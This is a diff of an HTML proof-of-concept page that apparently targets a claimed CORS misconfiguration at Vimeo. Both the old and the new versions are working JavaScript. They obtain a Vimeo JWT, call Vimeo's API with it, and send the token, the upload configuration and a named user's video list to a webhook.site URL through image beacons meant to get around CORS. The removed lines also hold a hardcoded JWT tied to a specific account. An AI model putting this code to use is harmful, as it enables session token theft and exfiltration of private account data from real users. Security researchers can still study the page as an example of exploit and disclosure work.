@@ -1,54 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS PoC (CORS-Free Exfiltration)</title>
+  <title>Vimeo CORS PoC – Auto JWT Extraction</title>
 </head>
 <body>
   <h1>Vimeo CORS Misconfiguration PoC</h1>
   <pre id="output">Loading...</pre>
 
   <script>
-    const exfil = "https://webhook.site/5749a8e8-dd44-4f2d-a5b6-229b51be49f1"; // Your webhook
-    const attackerJwt = "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTU4NTY1NjAsInVzZXJfaWQiOjI0NDk0MzYzNSwiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiN2UzOTJkMzMtMmJhYi00MWFlLWFkNzEtYzFiM2U3MDU4ZDQzIiwic2giOiJhZDgyYTY4ZTRlMGZiY2U0NjgyM2I0NTM5ZmFkMjNkYzI1NjhiNDY5YjQ4NjU2MjFkNDcyMzA0YTY4ZjMxNWE0In0.cpdcmnY3KIl43yS9AgyoIfiyuAbKXB959CPY4HqyaRw"";  // Replace with a valid JWT
+    const exfil = "https://webhook.site/5749a8e8-dd44-4f2d-a5b6-229b51be49f1";
 
-    // Step 1: Call /upload/config with attacker's JWT
-    fetch("https://api.vimeo.com/upload/config", {
-      credentials: "include",
-      headers: {
-        "Authorization": attackerJwt
-      }
-    })
-    .then(r => r.json())
-    .then(configData => {
-      document.getElementById("output").innerText = "Stolen /upload/config:\n" + JSON.stringify(configData, null, 2);
+    // Step 1: Fetch Vimeo homepage via local proxy
+    fetch("http://localhost:3000/fetch?url=https://vimeo.com")
+      .then(response => response.text())
+      .then(html => {
+        // Step 2: Extract JWT using regex
+        const jwtMatch = html.match(/"jwt"\s*:\s*"([^"]+)"/);
+        if (!jwtMatch) throw new Error("JWT token not found in Vimeo homepage");
 
-      // Exfil stolen config via image beacon (bypasses CORS)
-      const configImg = new Image();
-      configImg.src = exfil + "?stolen_config=" + encodeURIComponent(JSON.stringify(configData));
+        const jwt = jwtMatch[1];
+        document.getElementById("output").innerText = "Extracted JWT:\n" + jwt;
 
-      // Extract JWT from the config
-      const stolenJwt = configData?.api?.jwt;
-      if (!stolenJwt) throw new Error("No JWT found in /upload/config response");
+        // Exfil the JWT via image (bypass CORS)
+        const jwtImg = new Image();
+        jwtImg.src = exfil + "?jwt=" + encodeURIComponent(jwt);
 
-      // Step 2: Use stolen JWT to request victim videos
-      const videosEndpoint =
-        "https://api.vimeo.com/users/244943635/videos?per_page=10&page=1&sizes=270x152%2C300x169&sort=last_user_action_event_date&filter=nolive&fields=download.codec,download.rendition,download.created_time,download.expires,download.fps,download.height,download.link,download.public_name,download.quality,download.size,download.size_short,download.source_link,download.type,download.video_file_id,download.width,duration,parent_project.uri,parent_project.is_private_to_user,last_user_action_event_date,manage_link,name,pictures.sizes.link,release_time,privacy.view,privacy.download,user.link,user.name,user.pictures,user.upload_quota,user.uri,embed,uri,link,can_move_to_project,review_page.link,metadata.can_be_replaced,metadata.interactions.delete,metadata.interactions.edit,metadata.interactions.invite,metadata.interactions.legal_hold.uri";
+        // Step 3: Use the JWT to call Vimeo API (real endpoint)
+        return fetch("https://api.vimeo.com/upload/config", {
+          headers: {
+            "Authorization": "jwt " + jwt
+          }
+        });
+      })
+      .then(r => r.json())
+      .then(configData => {
+        document.getElementById("output").innerText += "\n\n/upload/config:\n" + JSON.stringify(configData, null, 2);
 
-      return fetch(videosEndpoint, {
-        headers: { "Authorization": "jwt " + stolenJwt }
+        // Exfil the config data via image (also bypass CORS)
+        const configImg = new Image();
+        configImg.src = exfil + "?stolen_config=" + encodeURIComponent(JSON.stringify(configData));
+
+        // Optionally extract a secondary JWT and make more calls
+        const secondJwt = configData?.api?.jwt;
+        if (secondJwt) {
+          return fetch("https://api.vimeo.com/users/244943635/videos", {
+            headers: {
+              "Authorization": "jwt " + secondJwt
+            }
+          }).then(r => r.json());
+        }
+      })
+      .then(videosData => {
+        if (!videosData) return;
+
+        document.getElementById("output").innerText += "\n\nVictim's Videos:\n" + JSON.stringify(videosData, null, 2);
+
+        // Exfil the videos via image
+        const videosImg = new Image();
+        videosImg.src = exfil + "?victim_videos=" + encodeURIComponent(JSON.stringify(videosData));
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error: " + err.message;
+        console.error(err);
       });
-    })
-    .then(r => r.json())
-    .then(videosData => {
-      document.getElementById("output").innerText += "\n\nVictim's Videos:\n" + JSON.stringify(videosData, null, 2);
-
-      // Exfil victim's videos via image beacon
-      const videoImg = new Image();
-      videoImg.src = exfil + "?victim_videos=" + encodeURIComponent(JSON.stringify(videosData));
-    })
-    .catch(err => {
-      document.getElementById("output").innerText = "Error: " + err;
-    });
   </script>
 </body>
 </html>
